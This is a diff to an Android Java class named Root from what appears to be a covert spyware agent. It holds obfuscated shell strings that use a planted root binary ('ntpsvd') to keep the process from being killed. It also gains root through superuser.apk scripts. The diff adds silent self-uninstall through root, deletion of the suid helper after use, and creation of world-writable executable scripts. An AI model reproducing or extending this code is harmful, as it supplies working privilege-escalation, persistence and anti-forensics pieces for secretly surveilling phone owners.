@@ -45,8 +45,8 @@ public class Root {
 				return true;
 			}
 		}
-		
-		return false; 
+
+		return false;
 	}
 
 	static public void adjustOom() {
@@ -57,13 +57,14 @@ public class Root {
 
 			return;
 		}
-		
+
 		int pid = android.os.Process.myPid();
 		// 32_34=#!/system/bin/sh
 		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
 		// /proc/
 		// 32_36=/oom_score_adj\"
-		String script = Messages.getString("32_34")+ "\n" + Messages.getString("32_35") + pid + Messages.getString("32_36") + "\n";
+		String script = Messages.getString("32_34") + "\n" + Messages.getString("32_35") + pid
+				+ Messages.getString("32_36") + "\n";
 		// 32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
 		// 32_38=/oom_adj\"
 		script += Messages.getString("32_37") + pid + Messages.getString("32_38") + "\n";
@@ -90,11 +91,48 @@ public class Root {
 		}
 	}
 
+	static public boolean uninstallRoot() {
+		if (Status.haveRoot() == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (adjustOom): cannot uninstall this way without root privileges"); //$NON-NLS-1$
+			}
+
+			return false;
+		}
+
+		// 32_34=#!/system/bin/sh
+
+		String packageName = Status.self().getAppContext().getPackageName();
+		String script = Messages.getString("32_34") + "\n";
+
+		script += "pm uninstall " + packageName + "\n";
+
+		String filename = "c";
+		if (createScript(filename, script) == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (uninstallRoot): failed to create uninstall script"); //$NON-NLS-1$
+			}
+
+			return false;
+		}
+
+		Execute ex = new Execute();
+		ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
+
+		removeScript(filename);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
+		}
+
+		return true;
+	}
+
 	// Prendi la root tramite superuser.apk
 	static public void superapkRoot() {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
-		final String suidext = Messages.getString("32_6"); // statusdb
+		final String suidext = Messages.getString("32_6"); // sdb
 
 		if (Status.haveSu() == false) {
 			return;
@@ -126,7 +164,7 @@ public class Root {
 			}
 
 			if (Root.createScript("s", script) == true) {
-				//32_7=/system/bin/chmod 755 
+				// 32_7=/system/bin/chmod 755
 				Process runScript = Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/s");
 				int ret = runScript.waitFor();
 				if (Cfg.DEBUG) {
@@ -140,13 +178,16 @@ public class Root {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (superapkRoot) execute 2: " + Messages.getString("32_31") + " ret: " + ret);
 				}
-				
+
 				Root.removeScript("s");
-			}else{
+			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " ERROR: (superapkRoot), cannot create script");
 				}
 			}
+			
+			File file = new File(Status.getAppContext().getFilesDir(), suidext);
+			file.delete();
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -186,15 +227,38 @@ public class Root {
 		}
 	}
 
+	static public boolean createScriptPublic(String name, String script) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (createScriptPublic): script: " + script); //$NON-NLS-1$
+		}
+
+		try {
+			FileOutputStream fos = Status.getAppContext().openFileOutput(name, Context.MODE_WORLD_WRITEABLE);
+			fos.write(script.getBytes());
+			fos.close();
+
+			Execute ex = new Execute();
+			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + name);
+
+			return true;
+		} catch (Exception e) {
+			if (Cfg.EXP) {
+				Check.log(e);
+			}
+
+			return false;
+		}
+	}
+
 	static public void removeScript(String name) {
-		File rem = new File(Status.getAppContext().getFilesDir() +"/" + name);
+		File rem = new File(Status.getAppContext().getFilesDir() + "/" + name);
 
 		if (rem.exists()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (removeScript) deleting: %s", name);
 			}
 			rem.delete();
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions) file does not exist, cannot delete: %s", name);
 			}
